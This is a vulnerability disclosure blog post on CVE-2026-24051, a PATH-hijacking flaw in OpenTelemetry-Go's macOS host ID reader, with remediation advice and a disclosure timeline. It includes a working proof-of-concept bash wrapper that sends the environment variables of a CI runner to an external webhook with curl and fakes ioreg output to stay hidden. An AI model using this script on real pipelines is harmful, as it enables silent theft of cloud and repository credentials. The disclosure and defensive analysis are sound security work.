---
layout: post
title: "i0Regret: Breaking the Chain — How a Missing Slash Led to Arbitrary Code Execution"
date: 2026-02-03
cve: "CVE-2026-24051"
severity: "High"
cvss: "8.8"
affected: "OpenTelemetry-Go SDK < v1.40.0"
---

In the cloud-native ecosystem, we rely on SDKs as the "truth" for telemetry and observability. We assume these libraries are passive observers, but when a core component like OpenTelemetry-Go trusts its environment too much, it stops being a sensor and starts being an entry point.

## Auditing the Observers

As part of our ongoing research into architectural "sinkholes" in cloud-native telemetry, I focused on how SDKs gather metadata about the environments they run in. OpenTelemetry-Go is a high-reputation project, but even the most trusted tools can harbor low-level oversights with high-level consequences.

The objective was to identify instances where an SDK's attempt to be helpful — like identifying its host — could be weaponized to compromise the very pipelines it is meant to monitor.

## The Danger of Relative Paths

The vulnerability exists within the `hostIDReader` component of the SDK, specifically on macOS (Darwin) systems. Inside `sdk/resource/host_id.go`, the SDK attempts to identify the host by executing the system utility `ioreg`.

The flaw is deceptively simple: **a missing slash.**

```go
// sdk/resource/host_id.go
func (r *hostIDReaderDarwin) read() (string, error) {
    result, err := r.execCommand("ioreg", "-rd1", "-c", "IOPlatformExpertDevice")
```

Instead of invoking the command using a secure, absolute path, such as `/usr/sbin/ioreg`, the library calls the binary by name only. In the world of runtime execution, this triggers a search through the directories listed in the `PATH` environment variable. If an attacker can manipulate the `PATH` or place a malicious file in a directory that precedes the legitimate system path, the SDK will execute the attacker's code instead of the system utility.

## From Build to Breach

While local exploitation is possible, the real blast radius is in **CI/CD environments**. Modern pipelines frequently pull external dependencies and run third-party scripts on shared runners where environment variables like `PATH` are often fluid.

I crafted a Proof of Concept (PoC) simulating a compromised build step. By injecting a malicious `ioreg` wrapper into the local directory, I was able to trigger the host ID lookup during the Go application initialization.

```bash
#!/bin/bash
set -u
WEBHOOK_URL="${WEBHOOK_URL:-https://webhook.site/REDACTED}"

# IMPACT: Stealing Environment Variables
echo "[*] Exfiltrating sensitive environment variables to Webhook..."
echo "[*] Webhook URL: ${WEBHOOK_URL}"

HTTP_CODE="$(curl -sS -o /dev/null -w "%{http_code}" \
    -X POST --data-binary "$(env)" "${WEBHOOK_URL}" || echo "CURL_ERROR")"
echo "[*] Webhook send result: ${HTTP_CODE}"

# Return a valid-looking XML to prevent the Go application from failing
echo '<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
   <key>IOPlatformUUID</key>
   <string>UUID-UUID-0000-0000-000000000000</string>
</dict>
</plist>'

exit 0
```

**The Result:** Without interrupting the build or triggering traditional alerts, the hijacked `ioreg` script successfully:

- **Harvested Environment Variables:** Scanned the runner's memory and state.
- **Exfiltrated Secrets:** Dispatched critical credentials, including `AWS_SECRET_ACCESS_KEY` and `GITHUB_TOKEN`, to an external webhook.

The application continues to function normally, leaving no immediate red flags while a massive credential leak occurs in the background.

![PoC exfiltration](/assets/images/otel-poc-exfiltration.png)
*The malicious ioreg wrapper exfiltrating CI secrets to an external webhook.*

## Hardening the Scope

Secure systems programming dictates that you should **never trust your environment to find your tools**. The remediation for this flaw was a surgical change: replacing the search-based command invocation with a direct call.

The maintainers updated the `hostIDReaderDarwin` implementation to use the absolute path for `ioreg`. This simple transition from `ioreg` to `/usr/sbin/ioreg` breaks the hijacking chain, ensuring the SDK maintains its integrity even in highly volatile CI/CD environments.

![Fix diff](/assets/images/otel-fix-diff.png)
*The one-line fix: using an absolute path instead of relying on PATH resolution.*

## Key Takeaways

**The "Absolute Path" Rule is Absolute.** In systems programming and SDK development, never rely on the shell's `PATH` to resolve system utilities. A missing `/usr/sbin/` prefix is not just a shortcut; it is a security debt that can be cashed in for Arbitrary Code Execution (ACE).

**Observability Tools are High-Value Targets.** Because SDKs like OpenTelemetry are integrated into the core of an application and run within sensitive environments (like CI/CD runners), they are "invisible" entry points. If an observer is compromised, the entire environment it monitors is compromised.

**The CI/CD "Secret" Problem.** Pipelines are often more vulnerable than production environments because they rely on shared runners and fluid environment variables. This vulnerability proves that a simple `go run` or `go test` in a compromised pipeline can lead to immediate exfiltration of `AWS_KEYS`, `GITHUB_TOKENS`, and other sensitive secrets.

**Silent Execution is the Deadliest.** As demonstrated in the PoC, the exploit does not crash the application. By returning a valid-looking XML/Plist response, the attacker ensures the build passes while the secrets are leaked in the background.

**Audit Your Dependencies' Environment Calls.** Security teams should use static analysis (SAST) or grep-based audits to find `exec.Command` calls that do not use absolute paths, especially in third-party libraries that interact with the host OS.

## Disclosure Timeline

| Date | Event |
|---|---|
| January 20, 2026 | Discovery & disclosure submitted to maintainers |
| January 22, 2026 | Patch developed and merged; CVE-2026-24051 assigned by GitHub |
| January 27–29, 2026 | Release planning for v1.40.0 |
| February 2, 2026 | Security advisory published; v1.40.0 released |
| February 3, 2026 | Dependabot alerts begin notifying downstream users |

We would like to extend our sincere gratitude to the OpenTelemetry team for their swift and professional handling of this security issue, with a special thank you to **@pellared** for the rapid development of the patch and **@arminru** for his diligent coordination and management of the disclosure process.

## References

- [GHSA-9h8m-3fm2-qjrq — GitHub Security Advisory](https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-9h8m-3fm2-qjrq)
- [CVE-2026-24051 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-24051)
- [Fix PR #7818](https://github.com/open-telemetry/opentelemetry-go/pull/7818)
